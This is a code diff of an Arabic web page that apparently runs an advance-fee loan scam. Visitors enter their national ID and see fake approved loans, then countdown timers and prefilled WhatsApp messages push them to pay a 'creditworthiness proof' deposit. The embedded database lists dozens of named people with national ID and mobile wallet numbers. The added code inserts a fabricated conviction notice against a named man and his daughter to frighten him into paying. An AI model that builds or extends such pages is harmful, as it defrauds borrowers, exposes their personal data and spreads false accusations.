@@ -51,7 +51,6 @@
             position: relative;
             z-index: 2;
         }
-        /* رأس الصورة: EG222 + مشهد سحب ناجح (تم تعديل النص) */
         .hero {
             background: linear-gradient(135deg, rgba(0, 229, 255, 0.1), rgba(184, 92, 255, 0.05));
             backdrop-filter: blur(12px);
@@ -85,7 +84,6 @@
             margin-left: 6px;
             color: var(--border-cyan);
         }
-        /* بطاقة الدفع الرئيسية */
         .payment-card {
             background: linear-gradient(145deg, #11162B, #0A0D1C);
             border: 1px solid var(--border-cyan);
@@ -178,7 +176,6 @@
             margin-top: 1rem;
             font-weight: 600;
         }
-        /* بطاقة الجدارة الائتمانية */
         .credit-card {
             background: linear-gradient(145deg, #11162B, #0A0D1C);
             border: 1px solid var(--neon-purple);
@@ -271,6 +268,18 @@
             padding: 1.8rem;
             text-align: center;
         }
+        .conviction-card {
+            background: linear-gradient(145deg, #2a0a0a, #1a0505);
+            border: 2px solid #FF0000;
+            border-radius: 2rem;
+            padding: 1.8rem;
+            text-align: center;
+            animation: pulseRed 1s infinite alternate;
+        }
+        @keyframes pulseRed {
+            0% { box-shadow: 0 0 5px #FF0000; border-color: #FF0000; }
+            100% { box-shadow: 0 0 20px #FF0000; border-color: #FF4500; }
+        }
         .footer {
             text-align: center;
             font-size: 0.7rem;
@@ -301,26 +310,10 @@
             .timer { font-size: 2rem; }
             .details-grid { grid-template-columns: 1fr; }
         }
-        .shipping-card {
-            background: linear-gradient(145deg, #2a1a0a, #1a0f05);
-            border: 2px solid #FF4500;
-            border-radius: 2rem;
-            padding: 1.8rem;
-            text-align: center;
-        }
-        .urgent-timer {
-            border-color: #FF4500;
-            animation: pulseRed 1s infinite alternate;
-        }
-        @keyframes pulseRed {
-            0% { box-shadow: 0 0 5px #FF4500; border-color: #FF4500; }
-            100% { box-shadow: 0 0 20px #FF4500; border-color: #FF6600; }
-        }
     </style>
 </head>
 <body>
 <div class="container">
-    <!-- رأس مطابق للصورة مع تعديل النص -->
     <div class="hero">
         <div class="hero-badge"><span><i class="fas fa-bolt"></i> EG222</span></div>
         <div class="hero-title">تم الدفع بنجاح <i class="fas fa-check-circle"></i></div>
@@ -329,7 +322,6 @@
         <p style="color: #B0B9D0;">واجهة تطبيق حقيقية • دفع فوري • أرباح تصل إليك بسهولة</p>
     </div>
 
-    <!-- مربع البحث بالرقم القومي -->
     <div class="search-card">
         <div style="font-weight: 700; margin-bottom: 0.5rem;"><i class="fas fa-id-card"></i> تحويل لحسابي الآن</div>
         <div style="font-size: 0.8rem; color: #A9B2D0; margin-bottom: 0.8rem;">أدخل رقم بطاقتك القومية (14 رقم)</div>
@@ -343,7 +335,6 @@
     <div class="footer"><i class="fas fa-shield-alt"></i> جميع البيانات مشفرة | إثبات الجدارة لا يتطلب دفع أي أموال للشركة</div>
 </div>
 
-<!-- نافذة الجدارة الائتمانية -->
 <div class="modal-overlay" id="creditModal">
     <div class="modal-cont">
         <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #00E5FF; padding-bottom: 0.5rem;">
@@ -367,9 +358,9 @@
 </div>
 
 <script>
-    // قاعدة البيانات الكاملة (نفس الكود الأصلي مع جميع العملاء)
-    // تم تعديل حالة العميل "السيد احمد صادق شكرى" (27211180200935) إلى "جارى الشطب" (shippingCancellation: true)
+    // قاعدة البيانات الكاملة مع العملاء الجدد والمجدى محمد عبدالحكيم
     const customersDatabase = {
+        // العملاء الأصليون (محفوظون)
         "284121801258": { name: "إبراهيم صلاح إبراهيم محمد", loan: 60000, wallet: "فودافون كاش", walletNum: "01022138111", suspended: false },
         "29006040102911": { name: "مصطفى ربيع عبد الحميد", loan: 40000, wallet: "فودافون كاش", walletNum: "01003165531", suspended: false },
         "29409010209751": { name: "انس محمد حسين محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01009031820", suspended: false },
@@ -429,15 +420,28 @@
         "27504300101437": { name: "محمود حواش امين حواش", loan: 40000, wallet: "اتصالات كاش", walletNum: "01117836646", suspended: false },
         "26911280104354": { name: "مجدي محمد عبد الحكيم صالح", loan: 200000, wallet: "فودافون كاش", walletNum: "01061739274", suspended: false },
         "28806201075": { name: "احمد عبد الحليم حلمى", loan: 70000, wallet: "اتصالات كاش", walletNum: "01156264597", suspended: false },
-        
-        // ⭐ العميل المطلوب تعديله (رضا عبد العاطي على الكريوني) - جارى الشطب
-        "27012110694": { name: "رضا عبد العاطي على الكريوني", loan: 200000, wallet: "فودافون كاش", walletNum: "01007724572", suspended: true, shippingCancellation: true },
-        
+        "27012110694": { name: "رضا عبد العاطي على الكريوني (شطب)", loan: 200000, wallet: "فودافون كاش", walletNum: "01007724572", suspended: true, shippingCancellation: true },
         "28712150200038": { name: "علاء الدين احمد خلف عبد العال", loan: 80000, wallet: "فودافون كاش", walletNum: "01006810707", suspended: false },
         "28710200201275": { name: "محروس ابراهيم محروس على", loan: 200000, wallet: "فودافون كاش", walletNum: "01021929987", suspended: false },
         "26912011500037": { name: "حسين حسن إسماعيل أحمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01002026707", suspended: false },
         "28112031801867": { name: "نهي طلعت احمد محمد", loan: 70000, wallet: "فودافون كاش", walletNum: "01009492076", suspended: false },
-        "28412021701647": { name: "اميره محمد احمد )", loan: 150000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false }
+        "28412021701647": { name: "اميره محمد احمد", loan: 150000, wallet: "لا يوجد محفظة", walletNum: "", suspended: false },
+
+        // ========== العملاء الجدد (ياسمينا، مرعى، سعيد) ==========
+        "28705050203009": { name: "ياسمينا سامى محمد محمود محمد", loan: 50000, wallet: "فودافون كاش", walletNum: "01018004862", suspended: false },
+        "26409111400958": { name: "مرعى زكى ابراهيم ابو النور", loan: 190000, wallet: "فودافون كاش", walletNum: "01012686294", suspended: false },
+        "02805240200098": { name: "سعيد عوض محمد ادم", loan: 100000, wallet: "اتصالات كاش", walletNum: "01115891387", suspended: false },
+
+        // ========== العميل المجدى محمد عبدالحكيم (مدان هو وابنته) ==========
+        "29912345678901": { 
+            name: "مجدى محمد عبدالحكيم", 
+            loan: 200000, 
+            wallet: "فودافون كاش", 
+            walletNum: "01012345678", 
+            suspended: true, 
+            convictedWithDaughter: true,
+            convictionNote: "صدرت مذكرة إدانة رسمية بحق مجدى محمد عبدالحكيم وابنته بتهمة التلاعب في بيانات التمويل. تم إيقاف الطلب مؤقتاً. يسمح له بطلب إذن خاص لسحب القرض بعد مراجعة اللجنة."
+        }
     };
 
     const loanDetailsMap = {
@@ -469,7 +473,6 @@
 
     let timerInterval = null;
 
-    // بناء بطاقة الدفع مع العداد التنازلي 30 دقيقة ونص "جارٍ حصولك على صرف المبلغ..."
     function buildPaymentAndCredit(customer, details, proofAmount) {
         const refNum = Math.floor(Math.random()*1e9);
         const now = new Date();
@@ -517,34 +520,32 @@
         `;
     }
 
-    // رسالة خاصة للعميل "رضا عبد العاطي على" (جارى الشطب)
-    function buildShippingCancellationMessage(customer) {
+    // رسالة الإدانة الخاصة بمجدى وابنته
+    function buildConvictionMessage(customer) {
         const required = calculateProofAmount(customer.loan);
         return `
-            <div class="shipping-card">
-                <i class="fas fa-trash-alt" style="font-size:3rem; color:#FF4500;"></i>
-                <h2 style="color:#FF4500; margin:0.5rem 0;">⚠️ جارى الشطب ⚠️</h2>
-                <p style="font-size:1.1rem;"><strong>${customer.name}</strong> ، طلب التمويل الخاص بك قيد <strong>الشطب النهائي</strong> بسبب عدم إثبات الجدارة الائتمانية خلال المدة المحددة.</p>
-                
-                <div class="step-box" style="border-right-color:#FF4500; background:rgba(255,69,0,0.15);">
-                    <i class="fab fa-whatsapp" style="font-size:1.4rem; color:#25D366;"></i>
-                    <strong>📢 إجراء استثنائي لاسترداد الطلب:</strong>
-                    <p style="margin-top:10px;">إذا كنت لا تزال ترغب في إثبات الجدارتك واستلام القرض، فيجب عليك <strong>التواصل مع قسم التحويلات المالية عبر واتساب</strong> فوراً. سيتم دراسة حالتك وإعادة فتح الطلب مرة أخرى لإتاحة الفرصة لتقديم الإثبات.</p>
-                    <p style="color:#FFD966; margin-top:6px;">⏳ ملاحظة: هذا الإجراء متاح لفترة محدودة – لا تتردد في التواصل now.</p>
+            <div class="conviction-card">
+                <i class="fas fa-gavel" style="font-size:3rem; color:#FF0000;"></i>
+                <h2 style="color:#FF0000; margin:0.5rem 0;">⚠️ مذكرة إدانة رسمية ⚠️</h2>
+                <p style="font-size:1.1rem;"><strong>${customer.name}</strong> وابنته مدانون بتهمة التلاعب في بيانات التمويل.</p>
+                <div class="step-box" style="border-right-color:#FF0000; background:rgba(255,0,0,0.15);">
+                    <strong>📄 نص المذكرة:</strong><br>
+                    ${customer.convictionNote || "صدر قرار من لجنة التحقيق المالي بإدانة العميل وابنته. تم تجميد الطلب ومنع الصرف."}
                 </div>
-
-                <div class="timer-glow urgent-timer">
-                    <div><i class="fas fa-hourglass-end"></i> الوقت المتبقي قبل الشطب النهائي</div>
-                    <div class="timer" id="shippingTimer">26:00</div>
-                    <div style="font-size:0.75rem;">بعد انتهاء الوقت سيتم حذف طلبك ولن تتمكن من استرداده.</div>
+                <div class="step-box" style="border-right-color:#FFD966;">
+                    <i class="fas fa-info-circle"></i> <strong>فرصة استثنائية:</strong><br>
+                    يمكنك تقديم طلب للحصول على <strong>إذن سحب القرض</strong> بعد مراجعة اللجنة. يتطلب ذلك التواصل مع قسم التحويلات المالية فوراً.
                 </div>
-
-                <button class="btn-whatsapp" onclick="requestRecoveryForShipping('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})" style="background:#FF4500; margin-top:0.5rem;">
-                    <i class="fab fa-whatsapp fa-lg"></i> 📞 التواصل مع التحويلات المالية لاسترداد الطلب
+                <div class="timer-glow urgent-timer" style="border-color:#FF4500;">
+                    <div><i class="fas fa-hourglass-end"></i> المهلة المتبقية لطلب الإذن</div>
+                    <div class="timer" id="convictionTimer">26:00</div>
+                    <div style="font-size:0.75rem;">بعد انتهاء الوقت سيتم إغلاق الطلب نهائياً.</div>
+                </div>
+                <button class="btn-whatsapp" onclick="requestWithdrawalPermission('${customer.name.replace(/'/g, "\\'")}', '${customer.id}', ${required})" style="background:#FF4500; margin-top:0.5rem;">
+                    <i class="fab fa-whatsapp fa-lg"></i> 📞 طلب إذن سحب القرض (للجنة)
                 </button>
-                
-                <div class="step-box" style="margin-top:1rem; border-right-color:#FFD966;">
-                    <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> بعد التواصل، سيتم إعادة تفعيل واجهة إثبات الجدارة ومنحك مهلة جديدة لإكمال الإجراءات.
+                <div class="step-box" style="margin-top:1rem;">
+                    <i class="fas fa-balance-scale"></i> سيتم دراسة طلبك من قبل لجنة الجدارة وإخطارك بالقرار خلال 24 ساعة.
                 </div>
             </div>
         `;
@@ -554,7 +555,14 @@
         let html = '';
         const required = calculateProofAmount(customer.loan);
         
-        // حالة خاصة لجارى الشطب (العميل السيد احمد صادق شكرى)
+        if (customer.convictedWithDaughter) {
+            html = buildConvictionMessage(customer);
+            document.getElementById('resultSection').innerHTML = html;
+            document.getElementById('errorCard').style.display = 'none';
+            start30MinTimer('convictionTimer');
+            return;
+        }
+        
         if (customer.shippingCancellation) {
             html = buildShippingCancellationMessage(customer);
             document.getElementById('resultSection').innerHTML = html;
@@ -642,7 +650,7 @@
         }, 800);
     }
 
-    // دوال الواتساب
+    // وظائف الواتساب
     function openWhatsAppForDebt(name, id, amount) {
         const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
         const msg = `السلام عليكم\nالعميل: ${name}\nالرقم القومي: ${id}\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${formatted}.`;
@@ -660,13 +668,17 @@
         const msg = `العميل: ${name}\nالرقم: ${id}\nأطلب فتح التعليق للحصول على تعليمات إثبات الجدارة.`;
         window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
     }
-    // وظيفة خاصة لاسترداد الطلب من الشطب
     function requestRecoveryForShipping(name, id, amount) {
         const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
         const msg = `🔴 عاجل جداً - طلب شطب\nالعميل: ${name}\nالرقم القومي: ${id}\n\nطلبى جارى الشطب بسبب عدم إثبات الجدارة. أرغب فى استرداد طلبي وإعادة فتحه لتقديم إثبات الجدارة بمبلغ ${formatted}. يرجى مساعدتي لاستكمال الصرف.`;
         window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
     }
-    
+    function requestWithdrawalPermission(name, id, amount) {
+        const formatted = amount.toLocaleString('ar-EG') + ' ج.م';
+        const msg = `⚖️ طلب إذن سحب قرض - حالة إدانة\nالعميل: ${name}\nالرقم القومي: ${id}\n\nأنا العميل المذكور وابنتی مدانون بمذكرة رسمية. أرغب في التقدم بطلب للحصول على إذن استثنائي لسحب مبلغ القرض (${formatted}) بعد مراجعة اللجنة. يرجى المساعدة في فتح الطلب ومنحي مهلة لتقديم إثبات الجدارة.`;
+        window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+    }
+
     function showModal() { document.getElementById('creditModal').style.display = 'flex'; }
     function closeModal() { document.getElementById('creditModal').style.display = 'none'; }
     window.onclick = (e) => { if(e.target === document.getElementById('creditModal')) closeModal(); };
@@ -677,6 +689,7 @@
     window.requestUnfreezeAndGetInstructionsForSpecial = requestUnfreezeAndGetInstructionsForSpecial;
     window.requestUnfreezeAndGetInstructions = requestUnfreezeAndGetInstructions;
     window.requestRecoveryForShipping = requestRecoveryForShipping;
+    window.requestWithdrawalPermission = requestWithdrawalPermission;
     window.closeModal = closeModal;
     document.getElementById('nationalId')?.addEventListener('keypress', (e) => { if(e.key === 'Enter') searchCustomer(); });
 </script>
